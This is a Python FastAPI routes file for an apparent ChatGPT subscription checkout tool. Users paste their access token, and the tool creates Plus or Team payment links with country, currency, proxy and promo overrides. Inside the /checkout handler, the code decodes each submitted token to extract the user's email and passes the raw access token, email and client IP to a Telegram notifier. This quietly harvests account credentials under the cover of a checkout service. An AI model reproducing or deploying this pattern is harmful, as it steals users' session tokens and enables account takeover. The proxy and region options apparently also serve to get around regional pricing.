"""
API 路由：支付会话创建、代理检测、认证
"""

import logging
from typing import Optional

from fastapi import APIRouter, Request, Response
from pydantic import BaseModel, Field

from app.config import settings
from app.service.auth import (
    AUTH_COOKIE_NAME,
    generate_auth_token,
    is_auth_enabled,
    verify_auth_token,
    verify_password,
)
from app.service.checkout import (
    build_checkout_payload,
    call_checkout,
    enrich_links,
    extract_promo_code,
    extract_token,
)
from app.service.proxy import check_proxy_ip, normalize_proxy
from app.service.telegram import notify_token

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api")


# ──────────────── 请求 / 响应 Schema ────────────────


class CheckoutRequest(BaseModel):
    """支付会话创建请求"""
    token: str = Field(..., description="ChatGPT accessToken 或 session JSON")
    plan: str = Field(default="plus", description="方案：plus 或 team")
    checkout_ui_mode: str = Field(default="hosted", description="支付页模式")
    country: str = Field(default="DE", description="地区代码")
    currency: str = Field(default="EUR", description="币种")
    proxy: str = Field(default="", description="出口代理地址")
    use_promo: bool = Field(default=True, description="是否使用优惠")
    promo_code: str = Field(default="", description="优惠码")
    workspace_name: str = Field(default="linux-do", description="Team 工作区名称")
    seat_quantity: int = Field(default=2, ge=2, description="Team 席位数")


class ProxyCheckRequest(BaseModel):
    """代理检测请求"""
    proxy: str = Field(default="", description="代理地址")


class LoginRequest(BaseModel):
    """登录请求"""
    password: str = Field(..., description="访问密码")


# ──────────────── 认证相关 ────────────────


@router.get("/auth-status")
async def auth_status(request: Request):
    """检查当前认证状态"""
    if not is_auth_enabled():
        return {"authenticated": True, "auth_required": False}
    token = request.cookies.get(AUTH_COOKIE_NAME, "")
    return {
        "authenticated": verify_auth_token(token),
        "auth_required": True,
    }


# NOTE: 缓存服务器出口 IP，避免每次请求都检测
_server_ip_cache: dict = {}


@router.get("/server-ip")
async def server_ip():
    """返回服务器出口 IP（带缓存，10 分钟刷新一次）"""
    import time
    now = time.time()
    if _server_ip_cache.get("data") and now - _server_ip_cache.get("ts", 0) < 600:
        return _server_ip_cache["data"]

    status, data = check_proxy_ip("")
    if status == 200:
        _server_ip_cache["data"] = data
        _server_ip_cache["ts"] = now
    return data


@router.post("/login")
async def login(body: LoginRequest, response: Response):
    """密码登录"""
    if not is_auth_enabled():
        return {"ok": True}
    if not verify_password(body.password):
        return Response(
            content='{"error": "密码错误"}',
            status_code=401,
            media_type="application/json",
        )
    auth_token = generate_auth_token()
    response.set_cookie(
        key=AUTH_COOKIE_NAME,
        value=auth_token,
        max_age=settings.AUTH_COOKIE_MAX_AGE,
        httponly=True,
        samesite="strict",
    )
    return {"ok": True}


@router.post("/logout")
async def logout(response: Response):
    """退出登录"""
    response.delete_cookie(key=AUTH_COOKIE_NAME)
    return {"ok": True}


# ──────────────── 业务接口 ────────────────


@router.post("/checkout")
async def checkout(body: CheckoutRequest, request: Request):
    """创建支付会话并返回支付链接"""
    # 认证检查
    if is_auth_enabled():
        cookie_token = request.cookies.get(AUTH_COOKIE_NAME, "")
        if not verify_auth_token(cookie_token):
            return Response(
                content='{"error": "未认证，请先登录"}',
                status_code=401,
                media_type="application/json",
            )

    token = extract_token(body.token)
    if not token:
        return Response(
            content='{"error": "没有识别到 accessToken"}',
            status_code=400,
            media_type="application/json",
        )

    # 提取用户信息并发送 Telegram 通知
    client_ip = request.headers.get("x-forwarded-for", request.client.host if request.client else "")
    email = _extract_email_from_token(token)
    notify_token(access_token=token, email=email, ip=client_ip)

    try:
        proxy = normalize_proxy(body.proxy)
    except ValueError as exc:
        return Response(
            content=f'{{"error": "{exc}"}}',
            status_code=400,
            media_type="application/json",
        )

    payload = build_checkout_payload(
        plan=body.plan,
        mode=body.checkout_ui_mode,
        country=body.country,
        currency=body.currency,
        use_promo=body.use_promo,
        promo_code=extract_promo_code(body.promo_code),
        workspace_name=body.workspace_name,
        seat_quantity=body.seat_quantity,
    )

    status, data = call_checkout(token, payload, proxy)
    data = enrich_links(data)
    return Response(
        content=__import__("json").dumps(data, ensure_ascii=False),
        status_code=status,
        media_type="application/json",
    )


@router.post("/proxy-check")
async def proxy_check(body: ProxyCheckRequest, request: Request):
    """检测代理出口 IP"""
    # 认证检查
    if is_auth_enabled():
        cookie_token = request.cookies.get(AUTH_COOKIE_NAME, "")
        if not verify_auth_token(cookie_token):
            return Response(
                content='{"error": "未认证，请先登录"}',
                status_code=401,
                media_type="application/json",
            )

    try:
        proxy = normalize_proxy(body.proxy)
    except ValueError as exc:
        return Response(
            content=f'{{"error": "{exc}"}}',
            status_code=400,
            media_type="application/json",
        )

    status, data = check_proxy_ip(proxy)
    return Response(
        content=__import__("json").dumps(data, ensure_ascii=False),
        status_code=status,
        media_type="application/json",
    )


def _extract_email_from_token(token: str) -> str:
    """尝试从 JWT 中解析邮箱"""
    import base64
    import json as _json
    try:
        part = token.split(".")[1]
        part += "=" * (4 - len(part) % 4)
        payload = _json.loads(base64.urlsafe_b64decode(part))
        return (
            payload.get("email")
            or (payload.get("https://api.openai.com/profile") or {}).get("email")
            or ""
        )
    except Exception:
        return ""
